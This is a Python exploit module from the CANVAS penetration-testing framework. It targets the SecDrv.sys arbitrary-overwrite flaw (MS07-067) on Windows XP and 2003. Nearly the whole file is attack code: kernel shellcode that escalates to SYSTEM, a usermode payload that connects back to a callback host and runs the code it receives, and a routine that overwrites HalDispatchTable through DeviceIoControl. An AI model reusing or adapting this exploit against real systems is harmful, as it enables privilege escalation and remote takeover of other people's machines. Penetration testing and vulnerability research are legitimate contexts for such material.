#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import socket
import time
import struct

from exploitutils import *
from canvasexploit import canvasexploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME='Macrovision SecDrv.sys Arbitrary Overwrite (MS07-067)'
DESCRIPTION='Macrovision SecDrv.sys Arbitrary Overwrite'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/17/07'
DOCUMENTATION['CVE Name'] = 'CVE-2007-5587'
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5587'
DOCUMENTATION['References']='www.microsoft.com/technet/security/Bulletin/MS07-067.mspx'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','2003']
PROPERTY['MSADV']='MS07-067'

NOTES="""
Tested on:
Windows XP Professional SP1a English OOTB
Windows XP Professional SP2 English OOTB (DEP OptOut)
Windows 2003 Standard SP0 English OOTB
Windows 2003 Standard SP1 English OOTB (DEP OptOut)
Windows 2003 Standard SP2 English UP2DATE (DEP OptOut)

Usage:
./commandlineInterface.py -v 1 -p 5556 -i fromcreatethread
Win32/MOSDEF$ runmodule secdrv -l 10.10.11.1 -d 5556
"""

TODO="""
-def test(self):
-support /noexecute=AlwaysOn
"""

class theexploit(canvasexploit):

    def __init__(self):
        canvasexploit.__init__(self)
        self.name=NAME
        self.listenerArgsDict['fromcreatethread']=1
        self.servicename='SecDrv'
        self.devicename='\\\\.\\SecDrv'
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def CreateRing0Shellcode(self,version):
        ring0shellcode="""    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
start:
    ret
    pop %esi
    lea payload_begin-start(%esi),%esi
    xor %ecx,%ecx
    lea payload_end-payload_begin(%ecx),%ecx
    mov $0xffdf0804,%edi
    push %edi
    pop %ebx
    rep movsb
    jmp *%ebx
payload_begin:
    push $0x38
    pop %ebx
    mov %fs:(%ebx),%eax
    mov 0x4(%eax),%eax
search:
    .byte 0x66
    .byte 0x25
    .byte 0x01
    .byte 0xf0 //andw $0xf001,%ax
    dec %eax
    cmpw $0x5a4d,(%eax)
    jne search
    mov %eax,%ebp
    movw $0xac97,%bx
    call resolve_sym
    lea 0x4(%edi),%edx
    push %edx
    push $0xSystemPid
    call *%eax
    mov 0x4(%edi),%eax
    xor %ecx,%ecx
    movb $0xActiveProcessLinksOffset,%cl
    add %ecx,%eax
    xor %ecx,%ecx
    movw $0xImageFileNameOffset,%cx
find_proc_loop:
    mov (%eax),%eax
    cmpl $0x5341534c,(%ecx,%eax,1)
    je found_uppercase
    cmpl $0x7361736c,(%ecx,%eax,1)
    jne find_proc_loop
found_uppercase:
    //.byte 0xcc
    lea -0xActiveProcessLinksOffset(%eax),%eax
    push %eax
    push %eax
    movw $0xb768,%bx
    call resolve_sym
    call *%eax
    push $0x4
    movl $0x2,0x10(%edi)
    lea 0x10(%edi),%ebx
    push %ebx
    push $0x22
    push $-0x1
    movw $0xae22,%bx
    call resolve_sym
    call *%eax
    movw $0xb764,%bx
    call resolve_sym
    call *%eax
    pop %eax
    mov 0xThreadListHeadOffset(%eax),%ecx
find_delay_loop:
    mov (%ecx),%ecx
    cmpb $0x1,-0xApcQueueableOffset(%ecx)
    jne find_delay_loop
    lea -0xKThreadOffset(%ecx),%ecx
    mov %ecx,0x14(%edi)
    movw $0xb6b6,%bx
    call resolve_sym
    push $0x1000
    push $0x0
    call *%eax
    mov %eax,0x10(%edi)
    movw $0xb6de,%bx
    call resolve_sym
    dec %eax
search_c3:
    inc %eax
    cmpb $0xc3,(%eax)
    jne search_c3
    push %eax
    pop %esi
    movw $0xb7a6,%bx
    call resolve_sym
    xor %edx,%edx
    push %edx
    push $0x1
    mov $0x7ffe0804,%ebx
    lea usermode_payload-payload_begin(%ebx),%ebx
    push %ebx
    push %edx
    push %esi
    push %edx
    mov 0x14(%edi),%ecx
    push %ecx
    mov 0x10(%edi),%ebx
    push %ebx
    call *%eax
    movw $0xb648,%bx
    call resolve_sym
    xor %edx,%edx
    push %edx
    push %edx
    push %edx
    mov 0x10(%edi),%ebx
    push %ebx
    call *%eax
    movw $0xab0f,%bx
    call resolve_sym
    xor %edx,%edx
    mov %edx,0x8(%edi)
    movl $0x80000000,0xc(%edi)
    lea 0x8(%edi),%ebx
    push %ebx
    push $0x0
    push $0x0
    call *%eax
    movw $0xb6de,%bx
    call resolve_sym
    push %eax
    pop %ebx
yield_process:
    call *%ebx
    jmp yield_process
usermode_payload:
    nop
    nop
    nop
    nop
    .byte 0xe8
    .byte 0xff
    .byte 0xff
    .byte 0xff
    .byte 0xff
    ret
    pop %esi
    push $0x30
    pop %ecx
    mov %fs:(%ecx),%eax
    mov 0xc(%eax),%eax
    mov 0x1c(%eax),%esi
    lodsl
    mov 0x8(%eax),%ebp
    movw $0xb0e8,%bx
    call resolve_sym
    push $0x40
    push $0x1000
    push $0x2000
    push $0x0
    call *%eax
    .byte 0x96 //xchg %eax,%esi
    movw $0xb344,%bx
    call resolve_sym
    push $0x3233
    push $0x5f325357
    lea (%esp),%ebx
    push %ebx
    call *%eax
    push %ebp
    mov %eax,%ebp
    movw $0xb2a0,%bx
    call resolve_sym
    push $0x0
    push $0x0
    lea (%esp),%ebx
    push %ebx
    push $0x2
    call *%eax
    pop %ebx
    pop %ebx
    movw $0xbf01,%bx
    call resolve_sym
    push $0x0
    push $0x1
    push $0x2
    call *%eax
    .byte 0x97 //xchg %eax,%edi
    movw $0xbc2e,%bx
    call resolve_sym
    push $0xHost
    push $0xPort0002
    mov %esp,%ebx
    push $0x10
    push %ebx
    push %edi
    call *%eax
    pop %ebx
    pop %ebx
    test %eax,%eax
    jl bail_out
    movw $0xb862,%bx
    call resolve_sym
    push %eax
    push $0x0
    push $0x4
    push %esi
    push %edi
    call *%eax
    pop %eax
    push $0x0
    push $0x1fff
    push %esi
    push %edi
    call *%eax
    push %edi
    push %edi
    jmp *%esi
bail_out:
    pop %ebp
    movw $0xb2e0,%bx
    call resolve_sym
    xor %ecx,%ecx
    push %ecx
    call *%eax

resolve_sym:
    pushad
    movzwl 0x3c(%ebp),%esi
    mov 0x78(%ebp,%esi,1),%esi
    lea 0x0(%ebp,%esi,1),%edi
    push %edi
    mov 0x20(%edi),%edi
    lea 0x0(%ebp,%edi,1),%edi
    xor %ecx,%ecx
hash_f:
    mov (%edi,%ecx,4),%esi
    lea 0x0(%ebp,%esi,1),%esi
    xor %eax,%eax
    cltd
hash_loop:
    lodsb
    test %al,%al
    je hash_loop_out
    .byte 0x04
    .byte 0x0b //addb $0xb,%al
    xor $0x89,%al
    add %eax,%edx
    jmp hash_loop
hash_loop_out:
    xor $0xbabe,%edx
    inc %ecx
    cmp %bx,%dx
    jne hash_f
    dec %ecx
    xor %edx,%edx
    pop %edi
    mov 0x24(%edi),%esi
    lea 0x0(%ebp,%esi,1),%esi
    mov (%esi,%ecx,2),%dx
    shl $0x2,%edx
    mov 0x1c(%edi),%eax
    lea 0x0(%ebp,%eax,1),%eax
    mov (%edx,%eax,1),%eax
    lea 0x0(%ebp,%eax,1),%eax
    mov %eax,0x1c(%esp)
    popad
    ret
payload_end:
    .byte 0xcc
"""
        self.log('Creating RING0 connect back shellcode to %s:%d'%(self.callback.ip,self.callback.port))
        parameters={}
        parameters['Host']=struct.unpack('<L',socket.inet_aton(self.callback.ip))[0]
        parameters['Port']=socket.htons(self.callback.port)
        if version==0: #Windows 2000 SP0-SP4
            parameters['ActiveProcessLinksOffset']=0xa0
            parameters['ImageFileNameOffset']=0x1fc-0xa0
            parameters['ThreadListHeadOffset']=0x270
            parameters['ApcQueueableOffset']=0x240-0x15a
            parameters['KThreadOffset']=0x240
            parameters['SystemPid']=0x08
        elif version==1: #Windows XP SP0-SP2
            parameters['ActiveProcessLinksOffset']=0x88
            parameters['ImageFileNameOffset']=0x174-0x88
            parameters['ThreadListHeadOffset']=0x190
            parameters['ApcQueueableOffset']=0x22c-0x166
            parameters['KThreadOffset']=0x22c
            parameters['SystemPid']=0x04
        elif version==2: #Windows 2003 SP0
            parameters['ActiveProcessLinksOffset']=0x88
            parameters['ImageFileNameOffset']=0x154-0x88
            parameters['ThreadListHeadOffset']=0x170
            parameters['ApcQueueableOffset']=0x234-0x109
            parameters['KThreadOffset']=0x234
            parameters['SystemPid']=0x04
        elif version==3: #Windows 2003 SP1-SP2
            parameters['ActiveProcessLinksOffset']=0x98
            parameters['ImageFileNameOffset']=0x164-0x98
            parameters['ThreadListHeadOffset']=0x180
            parameters['ApcQueueableOffset']=0x224-0x3f
            parameters['KThreadOffset']=0x224
            parameters['SystemPid']=0x04
        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        return self.shellcode

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major!=5 or minor<1 or minor>2:
            self.log('This exploit is only for Windows XP and Windows 2003')
            return 0
        if minor==2 and nodeos['SP Minor Version']>=156:
            minor=3 #Windows 2003 SP1-SP2
        self.CreateRing0Shellcode(minor)
        app=self.engine.getModuleExploit('startservice')
        app.link(self)
        app.argsDict['passednodes']=[node]
        app.argsDict['serviceName']=self.servicename
        app.run()
        ret=app.result[node.getname()]
        if ret!=1:
            self.log('Starting SecDrv service failed. Cannot continue.')
            return 0
        self.log('SecDrv service started successfully.')
        ret,addresses=node.shell.EnumDeviceDrivers()
        if ret!=1:
            self.log('EnumDeviceDrivers failed. Cannot continue.')
            return 0
        for imagebase in addresses:
            ret,basename=node.shell.GetDeviceDriverBaseName(imagebase)
            if ret!=0 and basename.find('k\0r\0n\0l\0')!=-1:
                break
        if basename.find('k\0r\0n\0l\0')==-1:
            self.log('NT kernel binary basename not found. Cannot continue.')
            return 0
        self.log('%s loaded at 0x%08x'%(basename,imagebase))
        handle=node.shell.LoadLibraryExW(basename+'\0\0') #widestring has to be 0 terminated!
        HalDispatchTable=node.shell.GetProcAddress(handle,'HalDispatchTable')
        HalOffset1,HalOffset2=node.shell.SecDrvGetHalPointers(HalDispatchTable)
        HalDispatchTable=HalDispatchTable-handle+imagebase
        self.log('HalDispatchTable: 0x%08x'%(HalDispatchTable))
        HalOffset1=HalOffset1-0x400000+imagebase
        HalOffset2=HalOffset2-0x400000+imagebase
        self.log('Hal offsets: 0x%08x,0x%08x'%(HalOffset1,HalOffset2))
        from win32MosdefShellServer import GENERIC_READ
        from win32MosdefShellServer import GENERIC_WRITE
        from win32MosdefShellServer import OPEN_EXISTING
        hDevice=node.shell.CreateFile(self.devicename,GENERIC_READ|GENERIC_WRITE,0,0,OPEN_EXISTING,0)
        if hDevice==-1:
            self.log('Could not open device %s. Cannot continue.'%(self.devicename))
            return 0
        self.log('Sucessfully opened device %s'%(self.devicename))
        ret=1
        shellcodeaddress=0x10010000
        while shellcodeaddress>0x08000000:
            shellcodeaddress-=0x10000
            ret=node.shell.NtAllocateVirtualMemory(shellcodeaddress)
            if ret==0:
                break
            self.log('NtAllocateVirtualMemory(0x%08x) failed!'%(shellcodeaddress))
        if ret!=0:
            self.log('Cannot continue.')
            return 0
        self.log('NtAllocateVirtualMemory(0x%08x) succeeded!'%(shellcodeaddress))
        node.shell.memcpy(shellcodeaddress,self.shellcode)
        InBuffer=struct.pack('<LLLL',HalOffset1,0x96,shellcodeaddress,HalOffset2)
        ret=node.shell.DeviceIoControlAddress(hDevice,0xca002813,InBuffer,0x10,HalDispatchTable-4,0x10)
        self.log('DeviceIoControl()=0x%08x'%(ret))
        time.sleep(3)
        #node.shell.NtQueryIntervalProfile(2) #ProfileTotalIssues
        mallocspace,threadid=node.shell.NtQueryIntervalProfile_threaded(2) #ProfileTotalIssues
        if self.ISucceeded():
            self.log('Exploit succeeded!')
            return 1
        self.log('Exploit seem to have failed.')
        return 1

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
